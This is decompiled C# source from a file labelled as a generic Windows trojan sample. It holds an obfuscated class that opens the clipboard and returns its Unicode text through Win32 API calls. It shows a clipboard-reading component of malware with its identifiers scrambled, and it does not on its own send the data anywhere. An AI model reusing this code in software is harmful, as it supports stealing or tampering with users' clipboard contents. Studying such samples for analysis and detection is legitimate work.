// Decompiled with JetBrains decompiler
// Type: Ŵ�ϒӛ�.KЮٚɮ˨
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-1f53f14c48ecd545980d315ae494ea6a2bd99fa1e9a3671debdf80626942bd2c.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using Ŵ\uFFFDϒӛ\uFFFD;

namespace Ŵ\uFFFDϒӛ\uFFFD
{
  [StandardModule]
  internal sealed class KЮٚɮ\u02E8
  {
    [DllImport("user32.dll", EntryPoint = "GetClipboardData")]
    private static extern IntPtr հëĂœ\uFFFD(uint _param0);

    [DllImport("user32.dll", EntryPoint = "IsClipboardFormatAvailable")]
    private static extern bool ϒm꾯늻\u07B4(uint _param0);

    [DllImport("user32.dll", EntryPoint = "OpenClipboard", SetLastError = true)]
    private static extern bool ϫ恁\uFFFDR\uFFFD(IntPtr _param0);

    [DllImport("user32.dll", EntryPoint = "CloseClipboard", SetLastError = true)]
    private static extern bool \uFFFD\u058F\u1CFCݝɛ();

    [DllImport("kernel32.dll", EntryPoint = "GlobalLock")]
    private static extern IntPtr \u0655\uFFFD뫆䕃\u061D(IntPtr _param0);

    [DllImport("kernel32.dll", EntryPoint = "GlobalUnlock")]
    private static extern bool RӤﾭ\uFFFD\uFFFD(IntPtr _param0);

    public static string іׁ丐̆؜()
    {
      int num1;
      string str1;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        if (!KЮٚɮ\u02E8.ϒm꾯늻\u07B4(13U))
          goto label_23;
label_4:
        num3 = 4;
        if (!KЮٚɮ\u02E8.ϫ恁\uFFFDR\uFFFD(IntPtr.Zero))
          goto label_23;
label_5:
        num3 = 6;
        string str2 = (string) null;
label_6:
        num3 = 7;
        IntPtr num4 = KЮٚɮ\u02E8.հëĂœ\uFFFD(13U);
label_7:
        num3 = 8;
        if (!(num4 != IntPtr.Zero))
          goto label_15;
label_8:
        num3 = 9;
        IntPtr ptr = KЮٚɮ\u02E8.\u0655\uFFFD뫆䕃\u061D(num4);
label_9:
        num3 = 10;
        if (!(ptr != IntPtr.Zero))
          goto label_13;
label_10:
        num3 = 11;
        str2 = Marshal.PtrToStringUni(ptr);
label_11:
        num3 = 12;
        KЮٚɮ\u02E8.RӤﾭ\uFFFD\uFFFD(ptr);
label_12:
label_13:
label_14:
label_15:
label_16:
        num3 = 15;
        KЮٚɮ\u02E8.\uFFFD\u058F\u1CFCݝɛ();
label_17:
        str1 = str2;
        goto label_23;
label_19:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
              case 5:
              case 17:
                goto label_23;
              case 4:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_14;
              case 15:
                goto label_16;
              case 16:
                goto label_17;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_19;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_23:
      if (num2 != 0)
        ProjectData.ClearProjectError();
      return str1;
    }
  }
}
